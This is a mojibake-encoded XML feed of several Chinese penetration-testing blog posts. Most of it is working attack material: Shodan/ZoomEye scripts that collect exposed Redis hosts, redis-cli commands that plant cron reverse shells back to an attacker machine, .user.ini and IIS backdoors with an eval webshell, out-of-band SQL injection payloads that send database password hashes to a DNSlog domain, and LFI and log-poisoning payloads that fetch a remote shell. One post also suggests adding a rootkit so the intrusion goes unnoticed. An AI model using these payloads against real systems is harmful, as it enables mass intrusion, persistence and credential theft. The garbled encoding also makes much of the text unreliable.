    <content type="text"><![CDATA[æœ€è¿‘MongoDBçš„æœªæˆæƒè®¿é—®ä¸çŸ¥é“ä¸ºå•¥ï¼Œå°±æ˜¯è¿™æ ·çªç„¶ç«äº†ï¼Œå…¶å®ä½ è¦æ˜¯ç•™æ„çš„è¯ï¼Œå…¶å®åœ¨2014å¹´çš„æ—¶å€™å°±å·²ç»æœ‰äººåœ¨ä¹Œäº‘åˆ·è¿‡è¿™ä¸ªäº†ï¼Œå…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯æ²¡å¯†ç ï¼Œç„¶åæš´éœ²åˆ°å…¬ç½‘ä¸Šå–½ã€‚ æœ¬æ¬¡ä¸»è¦åšä¸€äº›redisçš„ä¸€ä¸ªæµ‹è¯•ï¼Œåˆšå¥½æœ€è¿‘å†å¼€å‘ä¸€ä¸ªç³»ç»Ÿï¼Œåˆšå¥½å†™å‡ ä¸ªè„šæœ¬åšæ’ä»¶ï¼Œä¹Ÿæé«˜ä¸‹å·¥ä½œæ•ˆç‡ã€‚ å…·ä½“æ¼æ´ç»†èŠ‚è¯·å‚è€ƒï¼šredisæœªæˆæƒè®¿é—® ç„¶ååˆ©ç”¨ZoomEyeå’ŒShodan APIè¿›è¡Œæ¡ä»¶æ‰¹é‡ç­›é€‰ ZoomEyeï¼šhttps://api.zoomeye.org/host/search?query=&quot;å…³é”®è¯&quot;&amp;page=Shodanï¼špip install shodan Shodan pythonè„šæœ¬å¦‚ä¸‹ï¼š123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Authorï¼šw2n1ck@åšå®¢ï¼šhttp://byd.dropsec.xyz/&apos;&apos;&apos;import shodanimport osiplist = []ip_list = []shodan_ip_list = []def shodanSearch(keywords): SHODAN_API_KEY = &quot;your key&quot; api = shodan.Shodan(SHODAN_API_KEY) total = 0 try: results = api.search(keywords) total = int(results[&apos;total&apos;]) for result in results[&apos;matches&apos;]: #iplist.append(&#123;&quot;ip&quot;:result[&apos;ip_str&apos;],&quot;country&quot;:result[&apos;location&apos;][&apos;country_name&apos;]&#125;) iplist.append(result[&apos;ip_str&apos;]) for i in range(len(iplist)): ip_list = iplist[i].encode(&apos;utf-8&apos;) shodan_ip_list.append(ip_list) s = &apos;\n&apos;.join(shodan_ip_list) with open(&apos;shodan_ip_list.txt&apos;,&apos;w&apos;) as output: output.write(s) except shodan.APIError, e: print &apos;Error: %s&apos; % eif __name__ == &apos;__main__&apos;: shodanSearch(&apos;redis&apos;) ZoomEye pythonè„šæœ¬å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Authorï¼šw2n1ck@åšå®¢ï¼šhttp://byd.dropsec.xyz/&apos;&apos;&apos;import osimport requestsimport jsonaccess_token = &apos;&apos;ip_list = []def login(): user = raw_input(&apos;[-] input : username :&apos;) passwd = raw_input(&apos;[-] input : password :&apos;) data = &#123; &apos;username&apos; : user, &apos;password&apos; : passwd &#125; data_encoded = json.dumps(data) # dumps å°† python å¯¹è±¡è½¬æ¢æˆ json å­—ç¬¦ä¸² try: r = requests.post(url = &apos;https://api.zoomeye.org/user/login&apos;,data = data_encoded) r_decoded = json.loads(r.text) # loads() å°† json å­—ç¬¦ä¸²è½¬æ¢æˆ python å¯¹è±¡ global access_token access_token = r_decoded[&apos;access_token&apos;] except Exception,e: print &apos;[-] info : username or password is wrong, please try again &apos; exit()def saveStrToFile(file,str): with open(file,&apos;w&apos;) as output: output.write(str)def saveListToFile(file,list): s = &apos;\n&apos;.join(list) with open(file,&apos;w&apos;) as output: output.write(s)def apiTest(): page = 1 global access_token with open(&apos;access_token.txt&apos;,&apos;r&apos;) as input: access_token = input.read() # å°† token æ ¼å¼åŒ–å¹¶æ·»åŠ åˆ° HTTP Header ä¸­ headers = &#123; &apos;Authorization&apos; : &apos;JWT &apos; + access_token, &#125; print headers while(True): try: r = requests.get(url = &apos;https://api.zoomeye.org/host/search?query=&quot;redis&quot;&amp;page=&apos; + str(page), headers = headers) &apos;&apos;&apos; å› ä¸ºæˆ‘ä»¬è¿›è¡Œçš„æ˜¯ä¸»æœºæœç´¢ï¼Œæ‰€ä»¥è¯·æ±‚çš„æ¥å£ä¸º: https://api.zoomeye.org/host/search?query=&quot;yoursring&quot;&amp;facet=app,os&amp;page= å¦‚æœè¿›è¡Œwebæœç´¢ï¼Œè¯·æ±‚æ¥å£ä¸º: https://api.zoomeye.org/web/search?query=&quot;port:21&quot;&amp;page= ?queryä¸ºè¦æœç´¢çš„å…³é”®å­— &apos;&apos;&apos; r_decoded = json.loads(r.text) # print r_decoded # print r_decoded[&apos;total&apos;] for x in r_decoded[&apos;matches&apos;]: print x[&apos;ip&apos;] ip_list.append(x[&apos;ip&apos;]) print &apos;[-] info : count &apos; + str(page * 10) except Exception,e: # è‹¥æœç´¢è¯·æ±‚è¶…è¿‡ API å…è®¸çš„æœ€å¤§æ¡ç›®é™åˆ¶ æˆ–è€… å…¨éƒ¨æœç´¢ç»“æŸï¼Œåˆ™ç»ˆæ­¢è¯·æ±‚ if str(e.message) == &apos;matches&apos;: print &apos;[-] info : account was break, excceeding the max limitations&apos; break else: print &apos;[-] info : &apos; + str(e.message) else: if page == 10: break page += 1def main(): # è®¿é—®å£ä»¤æ–‡ä»¶ä¸å­˜åœ¨åˆ™è¿›è¡Œç™»å½•æ“ä½œ if not os.path.isfile(&apos;access_token.txt&apos;): print &apos;[-] info : access_token file is not exist, please login&apos; login() saveStrToFile(&apos;access_token.txt&apos;,access_token) apiTest() saveListToFile(&apos;zoomeye_ip_list.txt&apos;,ip_list)if __name__ == &apos;__main__&apos;: main() æŠŠè¦æœç´¢çš„å…³é”®è¯æ”¹ä¸€ä¸‹å³å¯æ‰¹é‡è·å–ç¬¦åˆæ¡ä»¶çš„ä¸»æœºåœ°å€ï¼š ç„¶åå°±æ˜¯redisçš„æ‰¹é‡éªŒè¯è„šæœ¬,GitHubä¸Šæœ‰ä¸€ä¸ªhackredisè„šæœ¬èƒ½å¤ŸéªŒè¯redisæœªæˆæƒè®¿é—®ï¼Œç„¶åæ‰¹é‡ç™»é™†åˆ°sshï¼Œä½†æ˜¯æˆ‘æœçš„ï¼Œå¯èƒ½äººå“å¤ªå·®ï¼Œä¸€ä¸ªéƒ½æ²¡ç™»é™†ä¸Šï¼Œå¯èƒ½ä¸å¯¹å…¬ç½‘å¼€æ”¾SSHæœåŠ¡äº†æˆ–è€…åšäº†IPé™åˆ¶ã€‚ ç„¶åå°±æ¢ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬å†™å…¥çš„å¯†é’¥ï¼Œä¼šè¦†ç›–è¿™ä¸ªæ–‡ä»¶authorized_keysï¼Œå¦‚æœåŸæ¥æœåŠ¡å™¨ä¸Šç®¡ç†å‘˜æ˜¯ä½¿ç”¨è¿‡å…¬é’¥çš„æ–¹æ³•ç™»é™†å°±ä¼šå¯¼è‡´ç®¡ç†å‘˜çš„å…¬é’¥å¤±æ•ˆï¼Œå®¹æ˜“è¢«ç®¡ç†å‘˜å‘ç°ã€‚ç›´æ¥åœ¨redisä¸‹å†™ä¸ªshellï¼Œç§ä¸ªåé—¨ï¼Œå†åŠ ä¸ªrootkitï¼Œå²‚ä¸æ˜¯ç¥ä¸çŸ¥é“é¬¼ä¸è§‰[æ–œçœ¼] redisåå¼¹shellï¼š CentOS 1234567891011echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/è¿œç¨‹ä¸»æœº/2333 0&gt;&amp;1\n\n&quot;|redis-cli -h ç›®æ ‡æœº -x set 1config set dir /var/spool/cronokconfig set dbfilename rootoksaveokç„¶åvpsä¸Šncç›‘å¬nc -lvv 2333 Ubuntuå¦‚æœæ˜¯ubuntuçš„ç³»ç»Ÿï¼Œæ˜¯ä¸èƒ½ç”¨bashå¼¹shellçš„ï¼Œå¯ä»¥ä½¿ç”¨pythonæ¥åå¼¹ã€‚ 1echo -e &quot;\n\n*/1 * * * * /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.0.0.1\&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n\n&quot; é™„åŠ ä¸ªå»ºè®®ï¼š12345678å¯ä»¥é…ç½®redis.confè¿™ä¸ªæ–‡ä»¶ï¼Œåœ¨redis-3.2.0ç›®å½•ä¸‹#é»˜è®¤åªå¯¹æœ¬åœ°å¼€æ”¾bind 127.0.0.1#æ·»åŠ ç™»é™†å¯†ç requirepass appleu0#åœ¨éœ€è¦å¯¹å¤–å¼€æ”¾çš„æ—¶å€™ä¿®æ”¹é»˜è®¤ç«¯å£port 2333#æœ€åè¿˜å¯ä»¥é…åˆiptablesé™åˆ¶å¼€æ”¾]]></content>
      <tags>
        <tag>è¿ç»´</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>Python</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>Redis</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iniå’Œiisåé—¨]]></title>
    <url>%2F2017%2F01%2F03%2Fini%E5%92%8Ciis%E5%90%8E%E9%97%A8%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘çœ‹äº†ä¸¤ä¸ªå…³äºiniå’Œåˆ©ç”¨iisæœ¬èº«æœºåˆ¶çš„åé—¨ã€‚ iniåé—¨.user.iniå®ƒæ¯”.htaccessç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯nginx/apache/IISï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚ .user.iniå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œPHP_INI_PERDIR ã€ PHP_INI_USERâ€çš„è®¾ç½®ã€‚å’Œphp.iniä¸åŒçš„æ˜¯ï¼Œ.user.iniæ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä¿®æ”¹äº†.user.iniåï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…user_ini.cache_ttlæ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ åˆ©ç”¨æ–¹æ³• æ–°å»º.user.iniï¼Œå†…å®¹ä¸ºï¼š 1auto_prepend_file=test.gif æ–°å»ºtest.gifï¼Œå†…å®¹ä¸ºï¼š 123&lt;?php @eval($_REQUEST[shell]);?&gt; æ–°å»ºecho.php,å†…å®¹ä¸ºï¼š 123&lt;?phpecho &quot;PHP is very good!&quot;;?&gt; è®¿é—®echo.phpå³å¯çœ‹åˆ°åé—¨ï¼š 1http://127.0.0.1:8080/php-backdoor/echo.php?shell=phpinfo(); iisåé—¨iisåé—¨æ˜¯ç”¨äº†iisæœ¬èº«çš„æœºåˆ¶ï¼Œå½“åœ¨httpå¤´é‡Œå¢åŠ ä¸€å­—æ®µå³å¯è§¦å‘åé—¨ï¼Œå¹¶æ‰§è¡Œå‘è¿‡æ¥çš„å‘½ä»¤ã€‚ æ­£å¸¸æƒ…å†µï¼š123456789101112131415161718192021GET /pwet.htm HTTP/1.1Host: 192.168.73.143Accept-Encoding: identityConnection: Keep-AliveContent-type: application/x-www-form-urlencodedAccept: */*HTTP/1.1 200 OKDate: Thu, 03 Feb 2011 12:16:50 GMTContent-Length: 31Content-Type: text/htmlLast-Modified: Mon, 21 Jun 2010 11:53:19 GMTAccept-Ranges: bytesETag: &quot;963779573811cb1:994&quot;Server: Microsoft-IIS/6.0&lt;html&gt;Pouetpouet&lt;/html&gt; åŠ å…¥æ¶æ„å­—æ®µ123456789101112131415161718192021222324252627282930313233343536373839GET /pwet.htm HTTP/1.1Host: 192.168.73.143Accept-Encoding: identityX-Order: ListDirConnection: Keep-AliveX-Data: QzpcContent-type: application/x-www-form-urlencodedAccept: */*HTTP/1.1 200 OKDate: Thu, 03 Feb 2011 12:16:57 GMTContent-Length: 353X-Resp: OKContent-Type: text/htmlLast-Modified: Mon, 21 Jun 2010 11:53:19 GMTAccept-Ranges: bytesETag: &quot;963779573811cb1:994&quot;Server: Microsoft-IIS/6.0&lt;html&gt;Pouetpouet&lt;/html&gt;[F] C:\AUTOEXEC.BAT[F] C:\boot.ini[F] C:\bootfont.bin[F] C:\CONFIG.SYS[D] C:\Documents and Settings[D] C:\Inetpub[F] C:\IO.SYS[F] C:\MSDOS.SYS[F] C:\NTDETECT.COM[F] C:\ntldr[F] C:\pagefile.sys[D] C:\Program Files[D] C:\System Volume Information[D] C:\WINDOWS[D] C:\wmpub]]></content>
      <tags>
        <tag>WAFç»•è¿‡</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€æµ‹è¯•å°æŠ€å·§ä¹‹DNSlog]]></title>
    <url>%2F2016%2F12%2F04%2Fdnslog%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[åœ¨æ¸—é€ç¯å¢ƒæ—¶ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ç–‘ä¼¼å‘½ä»¤æ‰§è¡Œè¿˜æœ‰äº›boolæ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰å›æ˜¾ã€‚ å‘½ä»¤æ‰§è¡Œæˆ‘ä»¬å¯èƒ½ä¼šç”¨å„ç§å„æ ·çš„è¯·æ±‚æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œå¯¹äºboolæ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥è¿™ä¸¤ç§æ³¨å…¥ç±»å‹çš„ç¼ºç‚¹å°±æ˜¯é€Ÿåº¦æ…¢ï¼Œæ•ˆç‡ä½ï¼Œä¸€ä¸ªæ˜¯åŸºäºå¯¹é”™åˆ¤æ–­æ•°æ®ï¼Œä¸€ä¸ªæ˜¯åŸºäºè®¿é—®æ—¶é—´æ¥åˆ¤æ–­æ•°æ®ï¼Œdnslogçš„å‡ºç°å°±æ­£å¥½å¼¥è¡¥äº†è¿™æ ·çš„ç¼ºé™·ã€‚ 0x00 åŸç†è¿™é‡Œå‚è€ƒä¸€ç¯‡paper ,ä¸€ä¸ªå¤§ç‰›çš„è¯¦ç»†è§£é‡Š:DNS in SQL Injection Attacks ç®€å•è¯´å°±æ˜¯ï¼šDNSLog ç”¨äºç›‘æµ‹ DNS å’Œ HTTP è®¿é—®è®°å½•ï¼Œå¯é€šè¿‡HTTPè¯·æ±‚ï¼Œè®©ç›®æ ‡ä¸»æœºä¸»åŠ¨è¯·æ±‚ DNSLog API åœ°å€ï¼Œæœ‰ç›¸åº”çš„è§£æè®°å½•ï¼Œåˆ™å¯åˆ¤å®šä¸ºå­˜åœ¨ç›¸åº”çš„æ¼æ´ã€‚ 0x01 åˆ©ç”¨é¦–å…ˆç»™å¤§å®¶åˆ†äº«ä¸€ä¸ªå…è´¹çš„dnslogå¹³å°(ps:è¦æ˜¯æœ‰cloudeyeæ¿€æ´»ç çš„å¯ä»¥å¿½ç•¥)ã€‚ å¹³å°ä¼šç»™æ¯ä¸€ä¸ªä¼šå‘˜åˆ†ä¸€ä¸ªäºŒçº§åŸŸåï¼Œxxx.ceye.ioã€‚ ç®€å•çš„æ¥è¯´ï¼Œdnslogå¹³å°è‡ªå·±ä¿ç•™dnsçš„æ—¥å¿—ä¿¡æ¯ï¼Œå¹¶å¯¹åº”æ¯ä¸ªä¼šå‘˜ä¸€ä¸ªäºŒçº§åŸŸåï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡ ping test.xxxxx.ceye.io è¿™æ ·çš„å¤šçº§åŸŸåæ–¹å¼ï¼ŒæŠŠæˆ‘ä»¬éœ€è¦è¿”å›çš„ä¿¡æ¯é“¾æ¥åˆ°urlä¸­ï¼Œç„¶ååˆ†ææ—¥å¿—ï¼Œtestéƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬å¾—åˆ°çš„ä¿¡æ¯ã€‚ 0x01.1 å‘½ä»¤æ‰§è¡Œåœ¨æˆ‘ä»¬æ‰¾åˆ°å‘½ä»¤æ‰§è¡Œæ¼æ´çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œè¿™æ ·çš„å‘½ä»¤åˆ¤æ–­ 12345linux:curl http://ip.port.domain.ceye.io/`whoami`ping `whoami`.ip.port.domain.ceye.iowindows:ping %USERNAME%.domain.ceye.io è¿™æ—¶å€™å°±å¯ä»¥å»dnslogç“¶ä½“æŸ¥çœ‹åˆ°ä¿¡æ¯ 0x01.2 SQLæ³¨å…¥SQL Serverå­˜å‚¨ç¨‹åºmaster..xp_dirtreeï¼ˆï¼‰ç”¨äºè·å–æ‰€æœ‰æ–‡ä»¶å¤¹çš„åˆ—è¡¨å’Œç»™å®šæ–‡ä»¶å¤¹å†…éƒ¨çš„å­æ–‡ä»¶å¤¹ã€‚12345678DECLARE @host varchar(1024);æ³¨å†Œä¸€ä¸ªåä¸º@hostçš„å˜é‡ï¼Œç±»å‹ä¸ºvarcharã€‚SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;è·å–db_name()ç„¶åè½¬æ¢æˆvarcharç±»å‹ï¼Œç„¶åå§è·å–çš„db_name()è¿”å›å€¼æ‹¼æ¥åˆ°dnslogå¹³å°ç»™æˆ‘ä»¬çš„å­åŸŸåé‡Œé¢ï¼Œç„¶åèµ‹å€¼ç»™@hostå˜é‡ã€‚EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);åˆ—è¿œç¨‹ä¸»æœºçš„foobar$ç›®å½•,ç”±äºæ˜¯è¿œç¨‹ä¸»æœºï¼Œæ‰€ä»¥ä¼šåšä¸€ä¸ªdnsè§£æï¼Œè¿™æ ·æˆ‘ä»¬çš„dnså¹³å°å°±èƒ½å¾—åˆ°æ—¥å¿—äº†http://xxxx.com.cn/?Id=123&apos;;DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);-- OracleUTL_INADDRåŒ…ç”¨äºäº’è”ç½‘çš„å¯»å€â€“è¯¸å¦‚æ£€ç´¢æœ¬åœ°å’Œè¿œç¨‹ä¸»æœºçš„ä¸»æœºåå’ŒIPçš„åœ°å€12345SELECT UTL_INADDR.GET_HOST_ADDRESS(&apos;ip.port.b182oj.ceye.io&apos;);SELECT UTL_HTTP.REQUEST(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;) FROM DUAL;SELECT HTTPURITYPE(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;).GETCLOB() FROM DUAL;SELECT DBMS_LDAP.INIT((&apos;oracle.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&apos;SYS&apos;)||&apos;.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL; MySQLMySQLçš„å‡½æ•°LOAD_FILE()è¯»å–æ–‡ä»¶å†…å®¹å¹¶å°†å…¶ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ï¼šLOAD_FILE()1SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM user WHERE user=&apos;root&apos; LIMIT 1),&apos;.b182oj.ceye.io\\abc&apos;)); PostgreSQLPostgreSQLçš„å£°æ˜COPYç”¨äºåœ¨æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶å’Œè¡¨ä¹‹é—´æ‹·è´æ•°æ®123456789101112131415DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGINSELECT INTO query_result (SELECT passwdFROM pg_shadow WHERE usename=&apos;postgres&apos;);exec_cmd := E&apos;COPY table_output(content)FROM E\&apos;\\\\\\\\&apos;||query_result||E&apos;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&apos;&apos;;EXECUTE exec_cmd;END;$$ LANGUAGE plpgsql SECURITY DEFINER;SELECT temp_function(); å†™ä¸ªè„šæœ¬ï¼š 1234567891011import urllib2for i in range(50): if i==0: continue url = &apos;&apos;&apos;http://xxxx.com.cn/?Id=123&apos;;DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);--&apos;&apos;&apos; url = url.replace(&quot;dbid=1&quot;,&quot;dbid=&quot;+str(i)) req = urllib2.Request(url) print req.get_full_url() print urllib2.urlopen(req).read()]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€æµ‹è¯•çš„ä¸€äº›å°æŠ€å·§]]></title>
    <url>%2F2016%2F11%2F20%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[ç»“åˆæœ€è¿‘å­¦ä¹ çš„çŸ¥è¯†ï¼Œæ€»ç»“ä¸€ä¸‹æ¸—é€æµ‹è¯•ä¸­çš„ä¸€äº›å°æŠ€å·§ï¼Œä»…åšå‚è€ƒã€‚ 0x01 PHPæ–‡ä»¶åŒ…å«åˆ©ç”¨ç½‘ç«™æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½:ï¼Œæ¯”å¦‚ä¸Šä¼ å¤´åƒä¹‹ç±»ï¼Œå¯ä»¥å°è¯•åŒ…å«ä¸Šä¼ çš„æ–‡ä»¶ã€‚ åˆ©ç”¨phpå°è£…åè®®php://inputå’Œdata://:ï¼ŒåŒ…å«postæ•°æ®é€ æˆphpå‘½ä»¤æ‰§è¡Œ. 12http://example.com/test.php?url=php://inputPOST:&lt;?php fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&apos;&lt;?php eval($_POST[&quot;pass&quot;]);?&gt;&apos;)?&gt; åŒ…å«logæ—¥å¿—æ–‡ä»¶:å½“æˆ‘ä»¬æäº¤æ¶æ„ä»£ç æ—¶ä¹Ÿä¼šè¢«è®°å½•ï¼Œç»“åˆè§£ææ¼æ´å³å¯getshell(æœ‰è¯»æƒé™)ã€‚ apacheæ—¥å¿—é»˜è®¤åœ¨/etc/httpd/logs/access_log; åœ¨æ—¥å¿—æ–‡ä»¶ä¸­æ’å…¥PHPä»£ç  æ–¹æ³•ä¸€ :ä½¿ç”¨burpsuitæŠ“åŒ…è®¿é—® ï¼Œç»•è¿‡æµè§ˆå™¨ç¼–ç &lt;&gt; æ–¹æ³•äºŒ :curl è®¿é—®ä¸å­˜åœ¨çš„url curl http://example/shell.php?=&lt;?php phpinfo();?&gt; è¿™æ ·phpä»£ç å°±è¢«å†™åˆ°logé‡Œé¢äº† åŒ…å«ä¸€ä¸‹æ—¥å¿—ï¼š http://127.0.0.1/lfi/index.php?page=/etc/httpd/logs/access_log åŒ…å«/proc/self/environæ–‡ä»¶:è¿™éœ€è¦PHPè¿è¡Œä½œä¸ºä¸€ä¸ªå…·æœ‰cgion/procä¼ªæ–‡ä»¶çš„ç³»ç»Ÿä¸”PHPè„šæœ¬æœ‰æƒè®¿é—®è¿™äº›ä¼ªæ–‡ä»¶ã€‚ å¡«å†™User-Agentå­—æ®µå¦‚ä¸‹ï¼š&lt;?system(&apos;wget http://eyidaima/shell.txt -O shell.php&apos;);?&gt; åŒ…å«ä¼šè¯æ–‡ä»¶:è¿™éœ€è¦æ”»å‡»è€…èƒ½æ§åˆ¶ä¼šè¯ä¸­çš„ä»»ä½•å­—ç¬¦ä¸²å€¼ï¼ˆæ³¨å…¥ä»£ç ï¼Œä¾‹å¦‚phpinfo(ï¼‰ï¼Œä¼šè¯æ–‡ä»¶å¿…é¡»å­˜æ”¾åœ¨serializedsessionæ–‡ä»¶ä¸”PHPè„šæœ¬èƒ½å¤Ÿè®¿é—®ä¼šè¯æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/tmp/sess_SESSIONIDæ–‡ä»¶ï¼‰ã€‚ åŒ…å«å…¶ä»–ç”±phpåº”ç”¨åˆ›å»ºçš„æ–‡ä»¶:åªè¦ä½ èƒ½æƒ³åˆ°çš„ï¼Œéƒ½å¯ä»¥å°è¯•åˆ›å»º,ç„¶ååŒ…å«ä»–ï¼Œæ¯”å¦‚æ•°æ®åº“æ–‡ä»¶ï¼Œç¼“å­˜æ–‡ä»¶ï¼Œåº”ç”¨ç¨‹åºçº§åˆ«çš„æ—¥å¿—ã€‚ 0x02 åˆ©ç”¨.htaccessæ–‡ä»¶ç»•è¿‡é»‘åå•.htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚è‡ªå®šä¹‰.htaccessä¸Šä¼ ï¼Œå†…å®¹å¦‚ä¸‹ï¼š123&lt;FileMatch â€œshell.jpgâ€&gt; SetHandler application/x-httpd-php &lt;/FileMatch&gt; åŒç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªshell.jpgæ–‡ä»¶ï¼Œå†…å®¹æ˜¯ä¸€å¥è¯ï¼Œè¿™ä¸ªæ—¶å€™å°±æˆåŠŸç»•è¿‡ã€‚ 0x03 PHPæµå°è£…ç»•è¿‡æˆªæ–­æŠ€å·§æ¥æºï¼šç‹æ¾ å‡è®¾å­˜åœ¨æ–‡ä»¶åŒ…å«çš„ä»£ç ä¸ºï¼š1234&lt;?php $a = $_GET[&apos;file&apos;];include $a.&apos;.html.php&apos;;?&gt; ä½†æ˜¯æˆ‘ä»¬%00æ— æ³•æˆªæ–­, åªèƒ½åŒ…å«xxxx.html.php é¦–å…ˆæˆ‘ä»¬æ–°å»ºä¸€ä¸ªhello.html.phpï¼Œå†…å®¹ä¸ºphpinfo(); ç„¶åå‹ç¼©æˆzip ç„¶åè®¿é—®å¦‚ä¸‹ç½‘å€,å³å¯æˆåŠŸåŒ…å«å‹ç¼©æ–‡ä»¶å†…çš„hello.html.php http://example/index.php?file=zip://test.zip%23hello æŠŠæˆ‘ä»¬è¾“å…¥çš„å˜é‡å’Œincludeåé¢çš„å˜é‡åˆèµ·æ¥å°±æ˜¯zip://test.zip#hello.html.php ä»£è¡¨å½“å‰ç›®å½•ä¸‹çš„test.zipå‹ç¼©åŒ…é‡Œé¢çš„hello.html.php,äºæ˜¯å°±åŒ…å«æˆåŠŸã€‚ 0x04 é€šç”¨é˜²æ³¨å…¥ç³»ç»Ÿgetshellå¾ˆå¤šäººæ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°é˜²æ³¨å…¥ç³»ç»Ÿï¼Œæ¯”å¦‚è¯´è®°å½•äº†ipï¼Œæ—¶é—´ï¼Œæäº¤æ•°æ®ç­‰ç­‰ï¼Œé€šè¿‡é˜…è¯»ç±»ä¼¼ç¨‹åºçš„æºç å¾—çŸ¥æ•°æ®è®°å½•åœ¨sqlin.aspã€‚ æäº¤å¦‚ä¸‹æ•°æ®ï¼š123â”¼æ” æ•¸ç•£æ•´çˆ ç…¥æ•µç‘³âˆ¨â‰¡â”©æ„¾ å¯†ç  a (åŠ å¯†æ–¹å¼æ˜¯:ANSI-&gt;Unicodeï¼›å·¥å…·ï¼šUNICODE2ANSI)æäº¤ and 1= â”¼æ” æ•¸ç•£æ•´çˆ ç…¥æ•µç‘³âˆ¨â‰¡â”©æ„¾ èœåˆ€è¿æ¥sqlin.aspå³å¯ã€‚ 0x05 iis+phpé»‘åå•ä¸Šä¼ çªç ´æŠ€å·§æ¥æºï¼šPç‰› åœ¨php+window+iisç¯å¢ƒä¸‹:123åŒå¼•å·==ç‚¹å·;å¤§äºç¬¦å·==é—®å·;å°äºç¬¦å·(â€œ&lt;â€)==æ˜Ÿå·(â€œ*â€); è¯¥ç‰¹æ€§åªèƒ½ç”¨äºæ–‡ä»¶ä¸Šä¼ æ—¶è¦†ç›–å·²çŸ¥çš„æ–‡ä»¶ï¼Œäºæ˜¯è¿™ç‰¹æ€§ä¾¿ç•¥æ˜¾é¸¡è‚‹.ä¸è¿‡Pç‰›å·²ç»ç»™å‡ºå®Œç¾åˆ©ç”¨çš„æ–¹æ³•ï¼š æ€è·¯å¦‚ä¸‹ï¼š 